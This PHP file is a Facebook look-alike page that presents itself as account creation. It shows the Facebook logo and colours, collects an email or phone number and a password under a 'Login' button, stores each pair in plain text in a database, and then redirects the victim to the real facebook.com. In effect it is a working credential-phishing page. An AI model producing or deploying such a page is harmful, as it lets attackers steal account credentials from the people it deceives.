<?php
// register.php

// Database connection settings
$host = 'localhost'; // Change to your database host
$dbname = 'facebook'; // Change to your database name
$username = 'root'; // Change to your database username
$password = ''; // Change to your database password

// Create a connection to the database
try {
    $conn = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    // Set the PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

// Handle form submission
$error = ''; // Initialize the error variable
$success = ''; // Initialize the success variable
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Check if the email already exists
    $stmt = $conn->prepare("SELECT * FROM Users WHERE email = :email");
    $stmt->execute(['email' => $email]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user) {
        $error = "Email already registered.";
    } else {
        // Prepare a query to insert new user without hashing the password
        $stmt = $conn->prepare("INSERT INTO Users (email, password) VALUES (:email, :password)");
        $stmt->execute([
            'email' => $email,
            'password' => $password // Store the password in plain text
        ]);
        $success = "Account created successfully! Redirecting to Facebook...";

        // Redirect to Facebook after successful registration
        header("Location: https://www.facebook.com");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Account</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .register-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            padding: 40px;
            width: 360px;
            text-align: center;
        }
        .logo img {
            max-width: 100px;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 18px;
            margin-bottom: 20px;
            color: #1c1e21;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            font-size: 14px;
            color: #65676b;
            margin-bottom: 5px;
            display: block;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            background-color: #f5f6f7;
            transition: border-color 0.3s;
        }
        .input-group input:focus {
            border-color: #1877f2;
            outline: none;
        }
        .register-button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .register-button:hover {
            background-color: #165eab;
        }
        .footer {
            margin-top: 15px;
            font-size: 14px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="register-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <h2>Create a new account</h2>
        <form method="POST" action="">
            <div class="input-group">
                <label for="email">Email or Phone</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="register-button">Login</button>
        </form>
        <?php if (!empty($error)): ?>
            <p style="color: red;"><?php echo htmlspecialchars($error); ?></p>
        <?php elseif (!empty($success)): ?>
            <p style="color: green;"><?php echo htmlspecialchars($success); ?></p>
        <?php endif; ?>
        <div class="footer">
            <p>don't have an account? <a href="login.php">Create Account</a></p>
        </div>
    </div>
</body>
</html>
